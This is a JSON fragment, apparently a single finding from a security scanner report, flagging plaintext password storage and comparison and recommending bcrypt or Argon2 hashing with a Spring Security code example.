          "properties": {
            "impact": 4,
            "likelihood": 3.5,
            "snippetStartLine": 15,
            "summary": "Passwords stored and compared in plaintext — no hashing applied anywhere in the authentication flow",
            "remediationSummary": "Store passwords as bcrypt/Argon2 hashes and compare with a constant-time password encoder; never store or compare cleartext passwords.",
            "remediation": "\n1. Hash passwords at registration/write time using a modern adaptive algorithm such as **bcrypt** (Spring Security `BCryptPasswordEncoder`) or **Argon2**.\n2. In `authenticate()`, load the stored hash and compare using `passwordEncoder.matches(rawPassword, storedHash)` — do NOT compare in SQL.\n3. Migrate existing passwords: force a reset for all existing accounts and re-hash on next successful login.\n\nExample with Spring Security:\n```java\nprivate final PasswordEncoder encoder; // BCryptPasswordEncoder injected\n\npublic boolean authenticate(String username, String password) {\n    List<String> hashes = jdbcTemplate.query(\n        \"SELECT password FROM users WHERE username = ?\",\n        new Object[]{username},\n        (rs, n) -> rs.getString(1));\n    return hashes.size() == 1 && encoder.matches(password, hashes.get(0));\n}\n```\n"
          }
